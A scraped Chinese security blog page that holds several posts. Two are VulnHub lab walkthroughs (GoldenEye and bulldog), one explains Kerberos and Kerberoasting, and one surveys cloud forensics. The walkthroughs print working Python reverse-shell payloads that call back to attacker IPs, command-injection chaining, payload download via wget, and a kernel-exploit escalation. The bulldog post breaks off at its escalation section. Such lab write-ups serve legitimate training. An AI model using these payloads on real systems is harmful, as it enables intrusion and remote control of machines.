<p><img src="/2021/05/28/VulnHub-GoldenEye/12.png"></p>
<p>密码为 secret1!</p>
<p>通过nc telnet连接pop3，登陆并查看boris的邮件信息</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/13.png"></p>
<p>其中三封邮件内容如下，</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/14.png"></p>
<p>root发给boris的邮件</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/15.png"></p>
<p>natalya发给boris的邮件</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/16.png"></p>
<p>alec发给boris的邮件</p>
<p>再查看natalya的邮件有什么信息。</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/17.png"></p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/18.png"></p>
<p>得到用户名密码、服务器域名和网址，可在/etc/hosts可添加信息后访问</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">username: xenia</span><br><span class="line">password: RCP90rulez!</span><br><span class="line"></span><br><span class="line">Domain: severnaya-station.com&#x2F;gnocertdir</span><br><span class="line"></span><br><span class="line">point this servers IP to severnaya-station.com in &#x2F;etc&#x2F;hosts.</span><br></pre></td></tr></table></figure>

<p>打开本机/etc/hosts。添加域信息</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/20.png"></p>
<p>登陆网站看到登陆框，此处是一个开源的CMS系统moodle，用刚才得到的用户名和密码登陆即可</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/21.png"></p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/22.png"></p>
<p>找到一封相关的邮件，邮件中标注doak的用户名：</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/23.png"></p>
<p>知道用户名继续hydra爆破，登陆邮件服务器：</p>
<p>此处因为实习原因，电脑更换，内网IP有所差，但实验内容不变。IP变为如下内容：</p>
<p>靶机：GoldenEye 192.168.221.128</p>
<p>攻击机：kali 192.168.221.130</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/24.png"></p>
<p>得到doak的CMS的账户密码：</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/25.png"></p>
<p>登陆CMS发现在doak隐私文件目录下for james文件下有一个txt文本，文本内容如下所示：</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/26.png"></p>
<p>找到一个jpg文件位于以下位置：</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/27.png"></p>
<p>使用wget下载到本地，并用strings或exiftool检查图片内容，发现Image Description字段为可疑base64</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import base64;s&#x3D;base64.&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/28/VulnHub-GoldenEye/28.png"></p>
<p>解码后为xWinter1995x!。到此得到管理员的账号密码，所有人信息一览无余</p>
<p>账号：admin</p>
<p>密码：xWinter1995x!</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/29.png"></p>
<h1 id="0x03-漏洞探测及利用"><a href="#0x03-漏洞探测及利用" class="headerlink" title="0x03 漏洞探测及利用"></a>0x03 漏洞探测及利用</h1><h2 id="查找历史漏洞"><a href="#查找历史漏洞" class="headerlink" title="查找历史漏洞"></a>查找历史漏洞</h2><p>已知Moodle版本为2.2.3。可能存在远程命令执行漏洞CVE-2013-3630，msf中存在此payload，不过打不通。</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/30.png"></p>
<h2 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h2><p>首先Home -&gt; Site administration -&gt; Plugins -&gt; Text editors -&gt; TinyMCE HTML editor，将Spell engine更换为PSpellShell。</p>
<p>在Home -&gt; Site administration -&gt; Server -&gt; System paths的Path to aspell处上传代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.187.128&quot;,8099));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure>

<p>监听本机8099端口</p>
<p>并在Home -&gt; My profile -&gt; Blogs -&gt; Add a new entry中新建blog，输入任意字符，点Toggle Spellchecker。即可监听成功</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/33.png"></p>
<p>靶机上有python 考虑用python获取TTY，否则无法执行某些命令，并查看用户名、内核信息和ID</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/34.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>

<p>根据之前获取的内核版本在Exploit-DB中找EXP</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/35.png"></p>
<h2 id="37292-c提权"><a href="#37292-c提权" class="headerlink" title="37292.c提权"></a>37292.c提权</h2><p>建立HTTP服务传输EXP</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m  http.server 8000</span><br></pre></td></tr></table></figure>

<p>进入靶机/tmp目录下载EXP</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/36.png"></p>
<p>执行后提示gcc并没有安装，更改EXPgcc为cc编译</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/40.png"></p>
<p>然后重新下载shell并编译</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/37.png"></p>
<p>运行EXP成功提权，在root目录下找到.flag.txt，注意不是flag.txt</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/38.png"></p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/39.png"></p>
<p>we get it!</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/41.png"></p>
<h1 id="0x04-复盘"><a href="#0x04-复盘" class="headerlink" title="0x04 复盘"></a>0x04 复盘</h1><ul>
<li><p>此处apache中间件无用武之地</p>
</li>
<li><p>用户名小写我是没想到</p>
</li>
</ul>
<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ol>
<li>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/goldeneye-1,240/">https://www.vulnhub.com/entry/goldeneye-1,240/</a></li>
<li>文章参考：<a target="_blank" rel="noopener" href="https://programmersought.com/article/93378040168/#_252">https://programmersought.com/article/93378040168/#_252</a></li>
<li><a target="_blank" rel="noopener" href="https://www.shawroot.cc/1842.html">https://www.shawroot.cc/1842.html</a></li>
<li>nc实现telnet连接pop3：<a target="_blank" rel="noopener" href="https://blog.csdn.net/LL458524906/article/details/74635272">https://blog.csdn.net/LL458524906/article/details/74635272</a></li>
<li>aspell参考：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1764068">https://cloud.tencent.com/developer/article/1764068</a></li>
<li>tty-teletypewriter：<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000038466327">https://segmentfault.com/a/1190000038466327</a></li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="Try & Enjoy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/" class="post-title-link" itemprop="url">域渗透前言之kerberos协议</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-05-25 09:51:20" itemprop="dateCreated datePublished" datetime="2021-05-25T09:51:20+08:00">2021-05-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-07-05 11:38:57" itemprop="dateModified" datetime="2021-07-05T11:38:57+08:00">2021-07-05</time>
              </span>

          
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>3.1k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>3 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="0x01-Kerberos简介"><a href="#0x01-Kerberos简介" class="headerlink" title="0x01 Kerberos简介"></a>0x01 Kerberos简介</h1><p>Kerberos认证中，最主要的问题是如何证明“你是你”的问题，当一个Client去访问Server上的某服务时，Server如何判断Client是否有权限来访问自己主机上的服务，同时保证在这个过程中的通讯内容即使被拦截/篡改也不影响通讯的安全性，这正是Kerberos解决的问题。在域渗透过程中Kerberos协议的攻防也至关重要。</p>
<h2 id="1-Kerberos协议框架"><a href="#1-Kerberos协议框架" class="headerlink" title="1.Kerberos协议框架"></a>1.<strong>Kerberos协议框架</strong></h2><p>在Kerberos协议中主要是有三个角色的存在：</p>
<ul>
<li><p>访问服务的Client</p>
</li>
<li><p>提供服务的Server</p>
</li>
<li><p>KDC（Key Distribution Center）密钥分发中心</p>
<p>其中KDC服务默认会安装在一个域的域控中，而Client和Server为域内的用户或者是服务，如HTTP服务，SQL服务。在Kerberos中Client是否有权限访问Server端的服务由KDC发放的票据来决定。</p>
<p><img src="/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/1.jpg"></p>
</li>
</ul>
<p>如果把Kerberos中的票据类比为一张火车票，那么Client端就是乘客，Server端就是火车，而KDC就是车站的认证系统。如果Client端的票据是合法的（由你本人身份证购买并由你本人持有）同时有访问Server端服务的权限（车票对应车次正确）那么你才能上车。当然和火车票不一样的是Kerberos中有存在两张票，而火车票只有一张。</p>
<p>由上图中可以看到<strong>KDC又分为两个部分</strong>：</p>
<p><strong>Authentication Server</strong>： AS的作用就是验证Client端的身份（确定你是身份证上的本人），验证通过就会给一张<strong>TGT</strong>（Ticket Granting Ticket）票给Client。</p>
<p><strong>Ticket Granting Server</strong>： TGS的作用是通过AS发送给Client的票（TGT）换取访问Server端的票（上车的票ST）。ST（ServiceTicket）也有资料称为TGS Ticket，为了和TGS区分，在这里就用ST来说明。</p>
<p><img src="/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/2.jpg"></p>
<p>KDC服务框架中包含一个<strong>KRBTGT</strong>账户，它是在创建域时系统自动创建的一个账号，可以暂时理解为他就是一个无法登陆的账号，在发送票据的时候会使用到其hash。</p>
<p><img src="/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/3.jpg"></p>
<h2 id="2-Kerberos认证-ticket-system"><a href="#2-Kerberos认证-ticket-system" class="headerlink" title="2. Kerberos认证-ticket system"></a>2. Kerberos认证-ticket system</h2><p>流程当Client想要访问Server上的某个服务时，需要先向AS证明自己的身份，然后通过AS发放的TGT向Server发起认证请求，这个过程分为三块：</p>
<p><strong>The Authentication Service Exchange</strong>：Client与AS的交互</p>
<p><strong>The Ticket-Granting Service (TGS) Exchange</strong>：Client与TGS的交互</p>
<p><strong>The Client/Server Authentication Exchange</strong>：Client与Server的交互</p>
<p><img src="/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/4.jpg"></p>
<p><strong>(1)The Authentication Service Exchange</strong></p>
<p>KRB_AS_REQ</p>
<p>Client-&gt;AS：发送 Authenticator1(Client 加密 TimeStamp)</p>
<p>第一步 Client 先向 KDC 的 AS 发送 Authenticator1，内容为通过 Client  Hash 加密的时间戳、ClientID、网络地址、加密类型等内容。</p>
<p><img src="/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/5.jpg"></p>
<p>KRB_AS_REP</p>
<p>AS-&gt; Client：发送 Client 加密的 sessionkey-as 和票据 TGT(KRBTGT HASH 加密的 sessionkey-as 和 TimeStamp)</p>
<p>在 KDC 中存储了域中所有用户的密码 HASH，当 AS 接收到 Client 的请求之后会根据 KDC 中存储的密码来解密，解密成功并且验证信息。验证成功后返回给 Client 由 Client 密码 HASH 加密的 sessionkey-as 和 TGT（由 KRBTGT HASH 加密的 sessionkey-as 和 TimeStamp 等信息）。</p>
<p><strong>(2)TheTicket-Granting Service (TGS) Exchange</strong></p>
<p>KRB_TGS_REQ</p>
<p>Client -&gt;TGS 发送 Authenticator2 (sessionkey-as 加密 TimeStamp) 和票据 TGT(KRBTGT HASH 加密的 sessionkey-as 和 TimeStamp)</p>
<p>Client 接收到了加密后的 Sessionkey-as 和 TGT 之后，用自身密码解密得到 Sessionkey-as，TGT 是由 KDC 密码加密，Client 无法解密。这时 Client 再用 Sessionkey-as 加密 TimeStamp 和 TGT 一起发送给 KDC 中的 TGS（TicketGranting Server）票据授权服务器换取能够访问 Server 的票据。</p>
<p><img src="/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/6.jpg"></p>
<p>KRB_TGS_REP</p>
<p>TGS-&gt; Client 发送 密文 1(sessionkey-as 加密 sessionkey-tgs) 和 票据 ST(Server 密码 HASH 加密 sessionkey-tgs)</p>
<p>TGS 收到 Client 发送过来的 TGT 和 Sessionkey-as 加密的 TimeStamp 之后，首先会检查自身是否存在 Client 所请求的服务。如果服务存在，则用 KRBTGT 密码解密 TGT。一般情况下 TGS 会检查 TGT 中的时间戳查看 TGT 是否过期，且原始地址是否和 TGT 中保存的地址相同。验证成功之后将用 sessionkey-as 加密的 sessionkey-tgs 和 Server 密码 HASH 加密的 Sessionkey-tgs 发送给 Client。</p>
<p><strong>(3)TheClient/Server Authentication Exchange</strong></p>
<p>KRB_AP_REQ</p>
<p>Client -&gt;Server 发送 Authenticator3(sessionkey-tgs 加密 TimeStamp) 和票据 ST(Server 密码 HASH 加密 sessionkey-tgs)</p>
<p>Client 收到 sessionkey-as 加密的 sessionkey-tgs 和 Server 密码 HASH 加密的 sessionkey-tgs 之后用 sessionkey-as 解密得到 sessionkey-tgs，然后把 sessionkey-tgs 加密的 TimeStamp 和 ST 一起发送给 Server。</p>
<p><img src="/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/7.jpg"></p>
<h1 id="0x02-Kerberoasting-对kerberos的渗透"><a href="#0x02-Kerberoasting-对kerberos的渗透" class="headerlink" title="0x02 Kerberoasting-对kerberos的渗透"></a>0x02 Kerberoasting-对kerberos的渗透</h1><p>在整个渗透的过程当中，KDC密钥分发中心是我们渗透的重点，因为KDC存储了域中所有用户的密码哈希。    </p>
<p>介绍 Kerberos 的认证流程时说到，在 KRB_TGS_REP 中，TGS 会返回给 Client 一张票据 ST，而 ST 是由 Client 请求的 Server 端密码进行加密的。当 Kerberos 协议设置票据为 RC4 方式加密时，我们就可以通过爆破在 Client 端获取的票据 ST，从而获得 Server 端的密码。</p>
<p>下图为设置 Kerberos 的加密方式，在域中可以在域控的「本地安全策略」中进行设置：</p>
<p><img src="/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/17.jpg"></p>
<p>设置RC4 方式加密。</p>
<p><img src="/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/18.jpg"></p>
<p>设置完成之后运行里输入「gpupdate」刷新组策略，策略生效。</p>
<h1 id="0x0-参考"><a href="#0x0-参考" class="headerlink" title="0x0 参考"></a>0x0 参考</h1><p><a target="_blank" rel="noopener" href="https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberos.html">https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberos.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/196434.html">https://www.freebuf.com/articles/system/196434.html</a></p>
<p><a target="_blank" rel="noopener" href="https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-SPN.html">https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-SPN.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.notion.so/e977d98f5bd740db87ac4e5cae38a442#57ac8897745f4a05a570415401ee7d5f">https://www.notion.so/e977d98f5bd740db87ac4e5cae38a442#57ac8897745f4a05a570415401ee7d5f</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/05/22/%E4%BA%91%E8%AE%A1%E7%AE%97%E5%8F%96%E8%AF%81%E7%BB%BC%E8%BF%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="Try & Enjoy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/05/22/%E4%BA%91%E8%AE%A1%E7%AE%97%E5%8F%96%E8%AF%81%E7%BB%BC%E8%BF%B0/" class="post-title-link" itemprop="url">云计算取证综述</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-05-22 16:55:05 / 修改时间：20:04:59" itemprop="dateCreated datePublished" datetime="2021-05-22T16:55:05+08:00">2021-05-22</time>
            </span>

          
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>834</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>由于目前所做项目及论文的原因(具体不便细说)，需要调研云取证，刚好在此做一总结。本篇文章主要是对云环境中电子数据的分析技术作以总结。</p>
<h1 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h1><p>Ruan K教授从技术、组织和法律三个维度划分云取证领域相关问题。</p>
<ul>
<li>技术维度：云计算环境中进行电子数据取证的具体过程和试用的技术和工具。</li>
<li>组织维度：云计算环境中包含的角色，包括云服务提供商、云服务用户、云服务中介、审计人员和取证人员，不同的角色在云取证活动中的职责不同，他们之间的交互可以促进云取证的实施。法律维度主要关注在涉及跨多个管辖区的法律问题。</li>
</ul>
<p>云计算在电子取证领域的领域包括定位电子数据所在虚拟机的物理位置、设计云取证模型等。设计云取证模型是当前云取证研究的主要方向之一，对于云取证工作具有重要的指导意义。本文主要研究云中电子数据的分析技术。</p>
<h1 id="0x02-云计算-Cloud-Computing"><a href="#0x02-云计算-Cloud-Computing" class="headerlink" title="0x02 云计算(Cloud Computing)"></a>0x02 云计算(Cloud Computing)</h1><p>云计算可以看作是并行计算、分布式计算和网格计算等计算机技术和网络技术的融合和发展。简单来说，云计算是通过网<br>络将庞大的计算处理程序自动分拆成无数个较小的子程序，再交由多部服务器所组成的庞大系统，经搜寻、计算、分析之后将<br>处理结果回传给用户。使用这项技术，网络服务提供者可以在数秒之内，达成处理数以千万计甚至亿计的信息，达到和超级计算<br>机同样强大效能的网络服务。  </p>
<h1 id="0x03-云环境中电子数据的分析技术研究"><a href="#0x03-云环境中电子数据的分析技术研究" class="headerlink" title="0x03 云环境中电子数据的分析技术研究"></a>0x03 云环境中电子数据的分析技术研究</h1><p>云环境下的电子数据分析：<strong>取证调查人员借助工具、算法对涉案的电子数据进行分析</strong>的过程。主要包括</p>
<ul>
<li>数据源分析</li>
<li>数据恢复</li>
<li>事件重构</li>
<li>数据检索</li>
</ul>
<p>云环境中的电子数据量大、数据格式多、多源证据时间戳不一致、网络环境复杂等特性为分析证据带来极大的挑战。</p>
<ol>
<li><p>数据量巨大：目前的研究思路已经从<strong>分析所有数据的取证</strong>转变为<strong>用机器学习分析取证</strong>；</p>
</li>
<li><p>数据源分析困难：借助SDN网络取证分析来实现网络攻击溯源；</p>
</li>
</ol>
<p>然而目前提出的方法均存在局限性，无法有效解决目前的困境。云环境中电子数据的分析方法臻待进一步研究。</p>
<h4 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h4><ol>
<li><a target="_blank" rel="noopener" href="https://www.secrss.com/articles/11419">https://www.secrss.com/articles/11419</a></li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/05/05/bulldog/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="Try & Enjoy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/05/05/bulldog/" class="post-title-link" itemprop="url">渗透测试之bulldog</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-05-05 20:44:04" itemprop="dateCreated datePublished" datetime="2021-05-05T20:44:04+08:00">2021-05-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-05-06 17:07:00" itemprop="dateModified" datetime="2021-05-06T17:07:00+08:00">2021-05-06</time>
              </span>

          
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>2.2k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>2 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今日突然冒出渗透靶机的想法，突然一看，前人早已栽好了树。</p>
<p>每日分享：原来在孩提时期就已经看过余华的活着，只是当时读懂活着的人不是我。</p>
<p>小狗拼命的想叫醒他的同伴，可他还不知道同伴可能再也醒不过来了</p>
<p>每天都有人跟你一样在注视着生活中的点滴</p>
<p>最后献上红楼的一句箴言：假亦真时真亦假，无为有处有还无</p>
<p>不知道既喜欢红楼又喜欢昆曲，把后半辈子都献给教授外国人红楼梦的他，心境又是如何呢</p>
<p>人生本来就是尝试的过程，正确与否在你以为</p>
<p>也罢，继续写博客辽</p>
<h1 id="0x01-资产收集"><a href="#0x01-资产收集" class="headerlink" title="0x01 资产收集"></a>0x01 资产收集</h1><p>靶机：Ubuntu16.04：192.168.127.134</p>
<p>攻击机：kali 2021.1：192.168.127.133</p>
<p>愣是想不起来这个命令叫啥：lsb_release -a</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 主机发现</span></span><br><span class="line"><span class="comment"># ping scan</span></span><br><span class="line">nmap -sn 192.168.127.0/24</span><br><span class="line"></span><br><span class="line"><span class="comment"># 端口扫描</span></span><br><span class="line">masscan --rate=10000 --ports 0-65535 192.168.127.134</span><br><span class="line"></span><br><span class="line"><span class="comment"># 探究端口服务</span></span><br><span class="line">nmap -sV -T4 -O -p 23,80,8080 192.168.127.134</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/05/bulldog/1.png"></p>
<p>可以看到python版本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 扫描子域名</span></span><br><span class="line">dirb http://192.168.127.134</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/05/bulldog/2.png"></p>
<p>去康康admin和dev分别是什么服务。访问admin会看到无验证码的登陆界面，而dev必须登陆之后才可以看到。</p>
<p>dev页面有多个邮箱，去康康dev的源码，可能会md5加密的密码存储，一看还真有。解密之后尝试登陆admin页面，发现后两个账号可以登陆进去。不过账号是邮箱的前面，也就是姓名，登陆进去之后，发现dev界面的web shell也有了权限。其实这个界面类似于拿到一台被限制命令白名单的机子。尝试绕过吧。</p>
<p><img src="/2021/05/05/bulldog/4.png"></p>
<h1 id="0x02-漏洞检测"><a href="#0x02-漏洞检测" class="headerlink" title="0x02 漏洞检测"></a>0x02 漏洞检测</h1><p><strong>远程命令执行漏洞检测</strong>：</p>
<p>使用;同时执行多个命令，被过滤；</p>
<p>使用**&amp;,&amp;&amp;,|**同时执行多个命令,成功。</p>
<p>查看敏感目录，发现3个用户：<br><img src="/2021/05/05/bulldog/3.png"></p>
<h1 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h1><p>试试反弹shell：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 在kali的/var/html/www目录下，搭建web服务</span></span><br><span class="line">python -m SimpleHTTPServer 80</span><br><span class="line"><span class="meta">#</span><span class="bash"> 攻击机监听1234端口</span></span><br><span class="line">nc -lvnp 1234</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 靶机执行wget命令尝试连接</span></span><br><span class="line">pwd &amp; wget http://192.168.127.133</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 靶机下载shell文件</span></span><br><span class="line">ls &amp; wget http://192.168.56.133/shell.py</span><br><span class="line"><span class="meta">#</span><span class="bash"> 靶机执行shell</span></span><br><span class="line">ls &amp; python shell.py</span><br><span class="line"><span class="meta">#</span><span class="bash"> 靶机删除shell</span></span><br><span class="line">ls &amp; rm -rf shell.py</span><br></pre></td></tr></table></figure>

<p>其中反弹shell脚本shell.py内容如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="comment"># create an INET, STREAMing socket</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="comment"># now connect to the web server on port 1234</span></span><br><span class="line">s.connect((<span class="string">&quot;192.168.127.133&quot;</span>, <span class="number">1234</span>))</span><br><span class="line">os.dup(s.fileno(), <span class="number">0</span>)</span><br><span class="line">os.dup(s.fileno(), <span class="number">1</span>)</span><br><span class="line">os.dup(s.fileno(), <span class="number">2</span>)</span><br><span class="line">p = subprocess.call([<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&#x27;-i&#x27;</span>])</span><br></pre></td></tr></table></figure>



<p><img src="/2021/05/05/bulldog/5.png"></p>
<p>进入home，查看其他用户:bulldogadmin  django</p>
<p>进入bulldogadmin，查看所有文件，此时还是ls -la找到隐藏目录.hiddenadmindirectory。找到可执行文件customPermissionApp。<strong>strings</strong>查看其中字符</p>
<p><img src="/2021/05/05/bulldog/6.png"></p>
<p>猜测密码SUPERultimatePASSWORDyouCANTget。不过此处H到底代表什么暂时还不清楚。</p>
<h1 id="0x04-提权-后门维持"><a href="#0x04-提权-后门维持" class="headerlink" title="0x04  提权/后门维持"></a>0x04  提权/后门维持</h1><p>此时无法提权，需要打开新终端</p>
